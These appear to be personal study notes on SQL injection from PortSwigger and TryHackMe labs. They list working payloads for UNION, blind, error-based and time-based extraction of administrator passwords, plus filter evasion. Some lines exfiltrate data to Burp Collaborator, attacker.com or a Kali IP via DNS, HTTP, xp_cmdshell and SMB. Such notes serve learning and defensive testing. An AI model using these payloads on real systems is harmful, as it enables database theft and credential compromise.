
[Burp Suite SQL Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
## Retrieving Hidden Data
Consider what query the application is ultimately running: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
1. `GET /filter?category=gifts` becomes
	1. `GET /filter?category='+OR+1=1-- HTTP/2`

## Subverting Application Logic
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
but we can skip the password check by changing our user to `admin'--`, making the second apostrophe ourselves to end the query

## SQL injection UNION attacks
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
- If you know the other tables, you can pull additional data from one of them 
- Requires:
	- The individual queries must return the same number of columns (same with INTERSECT and EXCEPT)
	- The data types in each column must be compatible between the individual queries (no text and images)
- Involves finding out: 
	- How many columns are being returned from the original query. How:
		- `' ORDER BY 1--` then `ORDER BY 2--` then `ORDER BY 3--` until you get an error or the wrong kind of response
		- `' UNION SELECT NULL--` then `' UNION SELECT NULL,NULL--` etc until an error or other response 
			- NULL is convertible to every data type. This technique might add an extra row of all `NULL`s, but it might look the same as an incorrect number, meaning this doesn't work. 
			- Then check that the column data type is compatible with string
			- Then you know the number of columns and which to use (`' UNION SELECT username, password FROM users--`)
	- Which columns returned from the original query are of a suitable data type to hold the results from the injected query by checking 'a' in each column (assuming 4) `' UNION SELECT 'a',NULL,NULL,NULL--`
- Retrieving multiple values from a single column:
	- `' UNION SELECT username || '~' || password FROM users--` (**This is only querying one column**)
		- Where `||` is a string concatenation operator on Oracle and `~` is used to differentiate

## Information Gathering
`SELECT table_name FROM information_schema.tables` then
`SELECT * FROM information_schema.columns WHERE table_name = '$tablename'`
- `GET /filter?category=%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
	- Then pick a table ('users_urcpzb')
- `GET /filter?category=%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_urcpzb'--`
	- Then pick a column or two (in this case because two columns in query)
- `GET /filter?category=%27+UNION+SELECT+username_ktursq,+password_zhuttt+FROM+users_urcpzb--`
	- Then read output of those columns

## Blind SQLi
Application behaves differently based on whether the condition is true or false
- Such whether a cookie exists for a logged in user
- Example of password guessing:
	1. `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
	2. `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
	3. `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
	- May be `SUBSTR` on some dbs

### Example
1. `TrackingId=xyz' AND '1'='1` (**xyz = cookie Value**) - to verify difference between true and false
2. `TrackingId=xyz' AND '1'='2` - to compare (false)
3. `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a` = to confirm a user beginning with `a`
4. `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a` - to confirm `administrator` user
5. `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a` - checks password is greater than 1
	1. assume it goes to 20
6. `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a` - checks that the first letter is a
7. `TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a` - checks that the second letter is a
8. `Cookie: TrackingId=7xoi8QZmDdgTeeS0' AND (SELECT SUBSTRING(password,$1,1) FROM users WHERE username='administrator')='$2`
	1. Use intruder to set payloads for $1 and $2 
		1. Cluster bomb checks for each version of each payload
		2. Then filter for responses that match, "Welcome back" in this case



## Error-based SQL injection
You may be able to induce the application to return a specific error response based on the result of a boolean expression, and you may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see Extracting sensitive data via verbose SQL error messages.
- You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.
- Ex:
	- `Cookie: TrackingId=7xoi8QZmDdgTeeS0' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
		- the CASE expression evaluates to `a` which does not cause an error
	- `Cookie: TrackingId=7xoi8QZmDdgTeeS0' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
		- it evaluates to `1/0`, which causes a divide-by-zero error.
	- The key is to then use that to determine whether the injected condition is true
		- `Cookie: TrackingId=7xoi8QZmDdgTeeS0' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
		- If the first letter of the password is `> m`, then it evaluates to `1/0` which causes the error
- Ex2:
	- `TrackingId=BswXnzkEYSSXEdIZ'` = shows an error
	- `TrackingId=BswXnzkEYSSXEdIZ''` = doesn't because the `'` is causing it
	- `TrackingId=BswXnzkEYSSXEdIZ'||(SELECT '')||'` = doesn't work because wrong db
	- `TrackingId=BswXnzkEYSSXEdIZ'||(SELECT '' FROM dual)||'` = does because it's Oracle (and dual is a table in Oracle which requires a table name)
	- **Now we need check invalid query using proper syntax**
	- `TrackingId=BswXnzkEYSSXEdIZ'||(SELECT '' FROM dual2)||'` = this causes an error
	- `TrackingId=BswXnzkEYSSXEdIZ'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
		- This confirms that users is a table by not returning an error
	- `TrackingId=BswXnzkEYSSXEdIZ'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
		- This does cause an error but:
	- `TrackingId=BswXnzkEYSSXEdIZ'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
		- This does not - **This means that if the 1=1 is true, there is an error, but if 1=2 is false, then there is no error**
	- `TrackingId=BswXnzkEYSSXEdIZ'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
		- Yes error means that the user does exist
	- `TrackingId=BswXnzkEYSSXEdIZ'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
		- Yes error means the password is greater than 1
		- Goes to 20 in this case
	- `TrackingId=BswXnzkEYSSXEdIZ'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
		- SUBSTR because it's Oracle, after than you can do the Intruder with the Cluster Bomb payloads
- use `CAST()` to change data type such as `CAST((SELECT example_column FROM example_table) AS int)`
- Ex3:
	- `TrackingId=ogAZZfxtOKUELbuJ'`
		- This checks to see an error, in this case closing the full SQL query
	- `TrackingId=ogAZZfxtOKUELbuJ'--`
		- This removes the error, suggesting the query is syntactically valid
	- `TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`
		- This shows a different error, saying that the `AND` condition must be boolean
	- `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
		- Valid query. Because it had to be **boolean**, we now have a true/false half of the query. 
	- `TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
		- This will show more than one row, causing an error
	- `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
		- This will leak the first name in this error: `ERROR: invalid input syntax for type integer: "administrator"`
	- `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
		- This will leak the password as an error


### Blind SQL Injection with time delay
Like error based, but checking for time instead of error:
```SQL
'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

Ex: `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

Ex1:
- `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
	- This confirms delay (try 1=2 after that)
- `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
	- Confirms that the username 'administrator' exists
- `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
	- checks pw length
- `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
	- checks if letter a is the first character
	- Cluster Bomb after this

## Blind Out-of-band (OAST)
exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control, typically DNS bc networks often allow free egress of DNS queries
**Burp Collaborator**
- best tool for out-of-band techniques

MSSQL - cause a DNS lookup on a specified domain
- `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`
- use Burp Collaborator to generate a unique subdomain and poll the Collaborator server to confirm  any DNS lookups
- Ex: Modify the `TrackingId` cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
	- `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//zruhjah5w4rhrfbh92d5tf21us0jogc5.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--`
- Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:
	- `'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`
	- This reads the Administrator password and appends it as a collaborator subdomain
	- Ex:
		- `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
		- Concatenates the SQL query with the collaborator subdomain

### Misc
#### Lab: SQL injection with filter bypass via XML encoding
```XML
`<stockCheck> 
	<productId>123</productId> 
	<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> </stockCheck>`
```
- Uses XML escape sequence to encode the s character in select for SQL queries
- Ex:
	- ```XML
	  <?xml version="1.0" encoding="UTF-8"?>
		  <stockCheck>
			  <productId>
			  1
			  </productId>
			  <storeId>
			  1 <@dec_entities>
				  UNION SELECT username || '~' || password FROM users WHERE username = 'administrator'
				</@dec_entities>
			</storeId>
		</stockCheck>
	  ```
- dec-entities = Extensions > Hackvertor > Encode > dec_entities

# Database Specific
## MySQL
Version: `SELECT @@version`
On MySQL, the `--` **must by followed by a space**, or you can use a `#`
## MSSQL
Version: `SELECT @@version`

## Oracle
Version: `SELECT * FROM v$version`
Built in tables: dual
Oracle database requires all `SELECT` statements to explicitly specify a table name.

## PostrgeSQL
Version: `SELECT version()`

## Labs
### Lab: SQL injection attack, querying the database type and version on Oracle
1. Determine the number of columns
	1. `'+order+by+3--` -> 500 error, so we have two
2. Determine the data types of the columns
	1. `'+UNION+SELECT+'a',+'a'--` -> this doesn't work because Oracle needs a FROM 
	2. So it needs `'+UNION+SELECT+'a',+'a'+FROM+dual--`
3. Version - **check cheat sheet** `SELECT banner FROM v$version`
	1. `GET /filter?category=Accessories'+UNION+SELECT+banner,+'a'+FROM+v$version--`

### Lab: SQL injection attack, listing the database contents on Oracle
1. Determine the number of columns
	1. `'+order+by+3--` -> 500 error, so we have two
2. Determine the other **table** (*we may not be in this table*)
	1. Retrieve list of tables: `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
	2. Looks like the able is USERS_FEQLHH
3. Determine columns in table: `'+UNION+SELECT+table_name,NULL+FROM+USERS_FEQLHH--`
	1. `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name+=+'USERS_FEQLHH'`
	2. This reveals `Email`, `USERNAME_MHBAKJ`, and `PASSWORD_DAFWKU`
4. Retrieve password of `administrator` user
	1. `'+UNION+SELECT+PASSWORD_DAFWKU,USERNAME_MHBAKJ+FROM+USERS_FEQLHH+WHERE+USERNAME_MHBAKJ+=+'administrator'--`
		1. 4apz8o9cu1f77vf2rn12
	2. It also works to select all of the usernames and passwords with: `GET /filter?category=Pets'+UNION+SELECT+PASSWORD_DAFWKU,USERNAME_MHBAKJ+FROM+USERS_FEQLHH--`

## Blind SQL injection with time delays
*I misunderstood the prompt for this I guess*
You simply capture any request, note that there is a `TrackingId` cookie, and *because it is used for a SQL query each time*, you can append more query info to the cookie itself. It looks like:
- `TrackingId=x'||pg_sleep(10)--`
- *Ideally I would have tried multiple types of sleep queries* because I did not initially know it was PostgreSQL


# THM Advanced Notes
## In-Band Vs. Out-Of-Band SQL Injection

- In-band SQL Injection:
	- Error-Based SQL Injection - try to get error messages from the machine
	- Union-Based SQL Injection - combine the results of two or more SELECT statements into a single result
- Inferential (Blind) SQL Injection:
	- Boolean-Based Blind SQL Injection - similar to error based but without the error messages
	- Time-Based Blind SQL Injection - confirm whether the query worked by measuring the response time: `SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--`
- Out-of-band SQL Injection - used when the attacker cannot use the same channel to launch the attack and gather results or when the server responses are unstable.


### Second Order SQL Injection
Also known as stored SQL injection, exploits vulnerabilities where user-supplied input is saved and subsequently used in a different part of the application, possibly after some initial processing.

- Essentially this means that you may set the value of one part of the table such that when it is accessed later, it executes, but not when it is initially set. Example:
	- Set SSN of a book to be `12345'; UPDATE books SET book_name = 'Hacked'; --` because retrieving that book later might look something like: `UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';`
		- Only instead it will be `UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';UPDATE books SET book_name = 'Hacked'; --`
		- This adds a new query to the query issued by the server, so in addition to updating the book to the new book name, it will also update all of the other books to used the title `Hacked`.

### Filter Evasion
#### Character Encoding
- URL Encoding
- Hexadecimal Encoding
- Unicode Encoding
Tip: Put it in the URL bar not the search field:
I.E. `http://10.10.171.107/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20%7C%7C%201=1%20--+`
- This decodes to `http://10.10.171.107/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20%7C%7C%201=1%20--+`

#### No-Quote SQL injection
- Using Numerical Values - `OR 1=1` instead of `' OR '1'='1`
- Using SQL Comments: `admin--` instead of `admin'--`
- Using CONCAT() Function - `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)` constructs the string admin

#### No Spaces
- SQL comments (`/**/`) to replace spaces. For example, instead of `SELECT * FROM users WHERE name = 'admin'`, an attacker can use `SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'`. SQL comments can replace spaces in the query, allowing the payload to bypass filters that remove or block spaces.  
    
- Tab (`\t`) or newline (`\n`) characters as substitutes for spaces. Some filters might allow these characters, enabling the attacker to construct a query like `SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'`. This technique can bypass filters that specifically look for spaces.  
    
- URL-encoded characters representing different types of whitespace, such as `%09` (horizontal tab), `%0A` (line feed), `%0C` (form feed), `%0D` (carriage return), and `%A0` (non-breaking space). These characters can replace spaces in the payload.

![](/assets/images/Advanced%20SQL%20Injection/Screenshot%202024-11-25%20at%204.11.45%20PM.png)


### Out of Band
**MySQL and MariaDB** - 
`SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';`

An attacker could then access this file via an SMB share or HTTP server running on the database server, thereby exfiltrating the data through an alternate channel.

**Microsoft SQL Server (MSSQL)**- 
`EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';`

Alternatively, `OPENROWSET` or `BULK INSERT` can be used to interact with external data sources, facilitating data exfiltration through OOB channels.  

**Oracle** - 
```php
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```

HTTP Requests: `SELECT http_post('http://kaliIP.com/exfiltrate', sensitive_data) FROM table;`

SMB Exfiltration: 
`1'; SELECT @@version INTO OUTFILE '\\\\$KaliIP$\\logs\\out.txt'; --`


### Other Techniques
#### HTTP Header Injection
A malicious User-Agent header would look like `User-Agent: ' OR 1=1; --`. If the server includes the User-Agent header in an SQL query without sanitizing it, it can result in SQL injection.

#### Exploit Stored Procedures
This requires that you find a stored procedure without sanitizing the input. 

#### XML and JSON Injection
Again, this requires that the application directly using the unsanitized inputs. 